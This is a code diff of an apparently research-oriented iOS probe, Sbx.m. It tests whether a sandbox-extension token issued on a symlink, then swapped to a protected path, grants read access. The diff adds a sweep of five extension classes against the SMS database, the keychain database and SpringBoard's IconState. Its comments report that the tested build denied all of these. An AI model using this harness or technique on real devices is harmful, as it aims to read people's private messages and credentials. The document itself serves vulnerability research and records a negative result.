@@ -1,13 +1,17 @@
-// Sbx.m - sandbox_extension TOCTOU reader + baseline control
+// Sbx.m - sandbox_extension: baseline control + class sweep
 //
-// Three modes per target, so the extension's contribution is measurable:
-//   #0  baseline : no token at all, straight stat/read          <- the control
-//   #f  file mode: symlink -> a regular file we own, issue, swap to target, consume
-//   #d  dir  mode: symlink -> a directory we own,    issue, swap to target, consume
+// Findings so far (iPhone14,3 / 27.0.1 / 24A446):
+//   #0 baseline == #f file-issue == #d dir-issue  for every target
+//   => "com.apple.app-sandbox.read" adds nothing; the 4 hits are just paths a
+//      normal sandboxed app may already read (/etc/passwd, /etc/hosts,
+//      .GlobalPreferences.plist, /var/preferences/com.apple.networkd.plist).
+//   => deniable targets (IconState.plist, sms.db, keychain-2.db) stay denied
+//      after consume, so the kernel checks the real path, not the token.
 //
-// If a target reads in #0, the extension added nothing there and the hit is just
-// baseline readability. Only targets that fail in #0 and succeed in #f/#d show
-// the bug doing real work.
+// What is left to try is the class. FilzaSlop's probe got NULL for
+// read-write on /var/mobile/Library/Preferences, but that is one path, one build.
+// The sweep below tries five classes against three denied targets and records
+// (a) whether issue returns a token at all and (b) whether the path then opens.
 //
 // Queue: Documents/sbx.txt, one line: tag<TAB>absolute-path
 
@@ -28,6 +32,15 @@ static NSString *gSbxDocs;
 static NSString *gSbxOut;
 static NSMutableArray *gSbxProduced;
 static NSMutableArray *gSbxSummary;
+
+static const char *kClasses[] = {
+    "com.apple.app-sandbox.read",
+    "com.apple.app-sandbox.read-write",
+    "com.apple.absolute-path.read-only",
+    "com.apple.absolute-path.read-write",
+    "com.apple.security.files.user-selected.read-only",
+};
+static const int kClassCount = 5;
 
 static void sbxLog(NSString *fmt, ...) {
     va_list ap;
@@ -61,41 +74,43 @@ static void sbxPut(NSString *name, NSData *data) {
     if ([data writeToFile:p atomically:YES]) [gSbxProduced addObject:name];
 }
 
-#pragma mark - primitives
+static void inspect(NSString *tag, const char *path, NSString *target) {
+    struct stat st;
+    if (stat(path, &st) != 0) {
+        sbxNote(@"     %-24s stat e%d", [tag UTF8String], errno);
+        return;
+    }
+    NSString *meta = [NSString stringWithFormat:
+        @"path=%@\nmode=%o\nsize=%lld\nuid=%u\ngid=%u\nisDir=%d\n",
+        target, st.st_mode, (long long)st.st_size, st.st_uid, st.st_gid,
+        ((st.st_mode & 0170000) == 0040000) ? 1 : 0];
+    sbxPut([tag stringByAppendingString:@".meta"], [meta dataUsingEncoding:NSUTF8StringEncoding]);
 
-static void tryList(NSString *tag, const char *path) {
-    DIR *dp = opendir(path);
-    if (dp == NULL) {
-        int e1 = errno;
-        int fd = open(path, O_RDONLY | O_DIRECTORY);
-        if (fd >= 0) {
-            dp = fdopendir(fd);
-            if (dp == NULL) close(fd);
-        }
+    if ((st.st_mode & 0170000) == 0040000) {
+        DIR *dp = opendir(path);
         if (dp == NULL) {
-            sbxNote(@"FAIL %-18s opendir e%d open/dir e%d", [tag UTF8String], e1, errno);
+            sbxNote(@"     %-24s opendir e%d", [tag UTF8String], errno);
             return;
         }
-    }
-    NSMutableArray *names = [NSMutableArray array];
-    struct dirent *de;
-    while ((de = readdir(dp)) != NULL && names.count < 4000) {
-        NSString *n = [NSString stringWithUTF8String:de->d_name];
-        if (n != nil && ![n isEqualToString:@"."] && ![n isEqualToString:@".."]) {
-            [names addObject:n];
+        NSMutableArray *names = [NSMutableArray array];
+        struct dirent *de;
+        while ((de = readdir(dp)) != NULL && names.count < 4000) {
+            NSString *n = [NSString stringWithUTF8String:de->d_name];
+            if (n != nil && ![n isEqualToString:@"."] && ![n isEqualToString:@".."]) {
+                [names addObject:n];
+            }
         }
+        closedir(dp);
+        NSString *body = [[[names sortedArrayUsingSelector:@selector(compare:)]
+                           componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
+        sbxPut([tag stringByAppendingString:@".dir"], [body dataUsingEncoding:NSUTF8StringEncoding]);
+        sbxNote(@"OK   %-24s dir %lu entries", [tag UTF8String], (unsigned long)names.count);
+        return;
     }
-    closedir(dp);
-    NSArray *sorted = [names sortedArrayUsingSelector:@selector(compare:)];
-    NSString *body = [[sorted componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
-    sbxPut([tag stringByAppendingString:@".dir"], [body dataUsingEncoding:NSUTF8StringEncoding]);
-    sbxNote(@"OK   %-18s dir %lu entries", [tag UTF8String], (unsigned long)names.count);
-}
 
-static void tryRead(NSString *tag, const char *path, int64_t size) {
     int fd = open(path, O_RDONLY);
     if (fd < 0) {
-        sbxNote(@"FAIL %-18s open e%d", [tag UTF8String], errno);
+        sbxNote(@"     %-24s open e%d", [tag UTF8String], errno);
         return;
     }
     NSMutableData *all = [NSMutableData data];
@@ -107,34 +122,13 @@ static void tryRead(NSString *tag, const char *path, int64_t size) {
     }
     close(fd);
     sbxPut([tag stringByAppendingString:@".bin"], all);
-    sbxNote(@"OK   %-18s %lu B", [tag UTF8String], (unsigned long)all.length);
+    sbxNote(@"OK   %-24s %lu B", [tag UTF8String], (unsigned long)all.length);
 }
 
-static void inspect(NSString *tag, const char *path, NSString *target) {
-    struct stat st;
-    if (stat(path, &st) != 0) {
-        sbxNote(@"FAIL %-18s stat e%d", [tag UTF8String], errno);
-        return;
-    }
-    NSString *meta = [NSString stringWithFormat:
-        @"path=%@\nmode=%o\nsize=%lld\nuid=%u\ngid=%u\nisDir=%d\n",
-        target, st.st_mode, (long long)st.st_size, st.st_uid, st.st_gid,
-        ((st.st_mode & 0170000) == 0040000) ? 1 : 0];
-    sbxPut([tag stringByAppendingString:@".meta"], [meta dataUsingEncoding:NSUTF8StringEncoding]);
-
-    if ((st.st_mode & 0170000) == 0040000) {
-        tryList(tag, path);
-    } else {
-        tryRead(tag, path, (int64_t)st.st_size);
-    }
-}
-
-#pragma mark - one attempt
-
-static void sbxOne(NSString *tag, NSString *target, int mode) {
+// mode: 0 = baseline (no token), 1 = issue on our own regular file
+static void sbxOne(NSString *tag, NSString *target, int mode, const char *cls) {
     const char *p = [target UTF8String];
 
-    // mode 0: control, no extension involved at all
     if (mode == 0) {
         inspect(tag, p, target);
         return;
@@ -142,39 +136,23 @@ static void sbxOne(NSString *tag, NSString *target, int mode) {
 
     NSString *tmp = NSTemporaryDirectory();
     NSString *s = [tmp stringByAppendingPathComponent:@"s"];
-    NSString *d = [tmp stringByAppendingPathComponent:@"d"];
     NSString *l = [tmp stringByAppendingPathComponent:@"l"];
-
-    if (mode == 2) {
-        [[NSFileManager defaultManager] createDirectoryAtPath:d
-                                 withIntermediateDirectories:YES attributes:nil error:nil];
-    } else {
-        [[@"x" dataUsingEncoding:NSUTF8StringEncoding] writeToFile:s atomically:YES];
-    }
+    [[@"x" dataUsingEncoding:NSUTF8StringEncoding] writeToFile:s atomically:YES];
 
     unlink([l UTF8String]);
-    if (symlink([(mode == 2 ? d : s) UTF8String], [l UTF8String]) != 0) {
-        sbxNote(@"FAIL %-18s symlink e%d", [tag UTF8String], errno);
-        return;
-    }
+    if (symlink([s UTF8String], [l UTF8String]) != 0) return;
 
-    char *token = sandbox_extension_issue_file("com.apple.app-sandbox.read", [l UTF8String], 0);
+    char *token = sandbox_extension_issue_file(cls, [l UTF8String], 0);
     if (token == NULL) {
-        sbxNote(@"FAIL %-18s issue=NULL", [tag UTF8String]);
+        sbxNote(@"     %-24s issue=NULL", [tag UTF8String]);
         unlink([l UTF8String]);
         return;
     }
 
     unlink([l UTF8String]);
-    if (symlink(p, [l UTF8String]) != 0) {
-        sbxNote(@"FAIL %-18s swap e%d", [tag UTF8String], errno);
-        free(token);
-        return;
-    }
+    if (symlink(p, [l UTF8String]) != 0) { free(token); return; }
 
     int64_t h = sandbox_extension_consume(token);
-    if (h <= 0) sbxNote(@"NOTE %-18s consume=%lld", [tag UTF8String], h);
-
     inspect(tag, [l UTF8String], target);
 
     if (h > 0) sandbox_extension_release(h);
@@ -182,13 +160,12 @@ static void sbxOne(NSString *tag, NSString *target, int mode) {
     unlink([l UTF8String]);
 }
 
-static void sbxAll(NSString *tag, NSString *target) {
-    sbxOne([tag stringByAppendingString:@"#0"], target, 0);
-    sbxOne([tag stringByAppendingString:@"#f"], target, 1);
-    sbxOne([tag stringByAppendingString:@"#d"], target, 2);
+static NSString *shortCls(const char *cls) {
+    NSString *s = [NSString stringWithUTF8String:cls];
+    s = [s stringByReplacingOccurrencesOfString:@"com.apple." withString:@""];
+    s = [s stringByReplacingOccurrencesOfString:@"security.files." withString:@""];
+    return s;
 }
-
-#pragma mark - entry
 
 int sbxRun(void) {
     gSbxDocs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
@@ -200,27 +177,38 @@ int sbxRun(void) {
 
     sbxLog(@"=== sbx start ===");
 
+    // Targets that are denied at baseline: these discriminate.
+    NSArray *deniedTags = @[@"iconstate", @"sms", @"keychain"];
+    NSArray *deniedPaths = @[
+        @"/var/mobile/Library/SpringBoard/IconState.plist",
+        @"/var/mobile/Library/SMS/sms.db",
+        @"/var/Keychains/keychain-2.db",
+    ];
+
+    // 1. baseline for the denied set
+    for (NSUInteger i = 0; i < deniedTags.count; i++) {
+        sbxOne([deniedTags[i] stringByAppendingString:@"#0"], deniedPaths[i], 0, NULL);
+    }
+
+    // 2. class sweep against the same targets
+    for (int c = 0; c < kClassCount; c++) {
+        for (NSUInteger i = 0; i < deniedTags.count; i++) {
+            NSString *tag = [NSString stringWithFormat:@"%@/%@",
+                             shortCls(kClasses[c]), deniedTags[i]];
+            sbxOne(tag, deniedPaths[i], 1, kClasses[c]);
+        }
+    }
+
+    // 3. queue, if present (both modes, default class)
     NSString *q = [NSString stringWithContentsOfFile:[gSbxDocs stringByAppendingPathComponent:@"sbx.txt"]
                                             encoding:NSUTF8StringEncoding error:nil];
-    if (q.length == 0) {
-        sbxLog(@"sbx.txt empty: built-in probe set (baseline + file + dir)");
-        sbxAll(@"privetc",     @"/private/etc");
-        sbxAll(@"mobilelib",   @"/var/mobile/Library");
-        sbxAll(@"media",       @"/var/mobile/Media");
-        sbxAll(@"passwd",      @"/etc/passwd");
-        sbxAll(@"hosts",       @"/etc/hosts");
-        sbxAll(@"globalprefs", @"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
-        sbxAll(@"networkd",    @"/var/preferences/com.apple.networkd.plist");
-        sbxAll(@"iconstate",   @"/var/mobile/Library/SpringBoard/IconState.plist");
-        sbxAll(@"keychain",    @"/var/Keychains/keychain-2.db");
-        sbxAll(@"sms",         @"/var/mobile/Library/SMS/sms.db");
-    } else {
-        NSArray *lines = [q componentsSeparatedByString:@"\n"];
-        for (NSString *line in lines) {
+    if (q.length > 0) {
+        for (NSString *line in [q componentsSeparatedByString:@"\n"]) {
             if (line.length == 0) continue;
             NSArray *parts = [line componentsSeparatedByString:@"\t"];
             if (parts.count < 2) continue;
-            sbxAll(parts[0], parts[1]);
+            sbxOne([parts[0] stringByAppendingString:@"#0"], parts[1], 0, NULL);
+            sbxOne([parts[0] stringByAppendingString:@"#f"], parts[1], 1, kClasses[0]);
         }
     }
 
@@ -229,27 +217,20 @@ int sbxRun(void) {
     [[idx dataUsingEncoding:NSUTF8StringEncoding]
         writeToFile:[gSbxOut stringByAppendingPathComponent:@"sbx_index.txt"] atomically:YES];
 
-    NSUInteger n0 = 0, nf = 0, nd = 0;
-    for (NSString *line in gSbxSummary) {
-        if (![line hasPrefix:@"OK"]) continue;
-        if ([line rangeOfString:@"#0 "].location != NSNotFound) n0++;
-        else if ([line rangeOfString:@"#f "].location != NSNotFound) nf++;
-        else if ([line rangeOfString:@"#d "].location != NSNotFound) nd++;
-    }
+    NSUInteger hits = 0;
+    for (NSString *line in gSbxSummary) if ([line hasPrefix:@"OK"]) hits++;
 
     NSMutableArray *sum = [NSMutableArray array];
-    [sum addObject:[NSString stringWithFormat:
-                    @"hits: #0=%lu  #f=%lu  #d=%lu   (%lu attempts)",
-                    (unsigned long)n0, (unsigned long)nf, (unsigned long)nd,
-                    (unsigned long)gSbxSummary.count]];
-    [sum addObject:@"--- #f/#d hits without a #0 hit = the bug ---"];
-    for (NSString *line in gSbxSummary) if ([line hasPrefix:@"OK"]) [sum addObject:line];
-    for (NSString *line in gSbxSummary) if (![line hasPrefix:@"OK"]) [sum addObject:line];
+    [sum addObject:[NSString stringWithFormat:@"%lu hit / %lu attempts",
+                    (unsigned long)hits, (unsigned long)gSbxSummary.count]];
+    [sum addObject:@"baseline #0 then class sweep on denied targets:"];
+    [sum addObjectsFromArray:gSbxSummary];
 
     NSString *sumText = [[sum componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
     [[sumText dataUsingEncoding:NSUTF8StringEncoding]
         writeToFile:[gSbxDocs stringByAppendingPathComponent:@"sbx_summary.txt"] atomically:YES];
 
-    sbxLog(@"=== sbx end: #0=%lu #f=%lu #d=%lu ===", (unsigned long)n0, (unsigned long)nf, (unsigned long)nd);
+    sbxLog(@"=== sbx end, %lu hits / %lu attempts ===", (unsigned long)hits,
+           (unsigned long)gSbxSummary.count);
     return 0;
 }
